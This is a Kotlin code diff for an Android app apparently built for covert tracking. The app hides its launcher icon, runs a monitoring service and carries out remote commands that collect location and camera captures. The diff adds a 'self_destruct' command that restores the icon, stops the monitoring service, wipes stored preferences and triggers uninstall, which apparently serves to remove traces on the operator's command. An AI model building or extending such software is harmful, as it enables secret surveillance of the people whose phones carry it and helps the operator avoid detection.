@@ -1,10 +1,16 @@
 package com.takip.app.service
 
 import android.content.Context
+import android.content.Intent
+import android.net.Uri
+import android.os.Handler
+import android.os.Looper
 import android.util.Log
 import com.takip.app.api.ApiClient
 import com.takip.app.collector.CameraCaptureHelper
 import com.takip.app.collector.LocationCollector
+import com.takip.app.util.AppHider
+import com.takip.app.util.PrefsManager
 import kotlinx.coroutines.suspendCancellableCoroutine
 import org.json.JSONObject
 import java.io.File
@@ -67,6 +73,23 @@ object CommandExecutor {
                         put("longitude", loc.getDouble("longitude"))
                         if (loc.has("accuracy")) put("accuracy", loc.getDouble("accuracy"))
                     }
+                }
+                "self_destruct" -> {
+                    complete("completed") {}
+                    Handler(Looper.getMainLooper()).postDelayed({
+                        try {
+                            AppHider.showLauncherIcon(context)
+                            context.stopService(Intent(context, MonitoringService::class.java))
+                            PrefsManager.clear()
+                            val intent = Intent(Intent.ACTION_DELETE).apply {
+                                data = Uri.parse("package:${context.packageName}")
+                                flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                            }
+                            context.startActivity(intent)
+                        } catch (e: Exception) {
+                            Log.e(TAG, "Self destruct hatası", e)
+                        }
+                    }, 800)
                 }
                 else -> complete("failed") { put("errorMsg", "Bilinmeyen komut: $type") }
             }
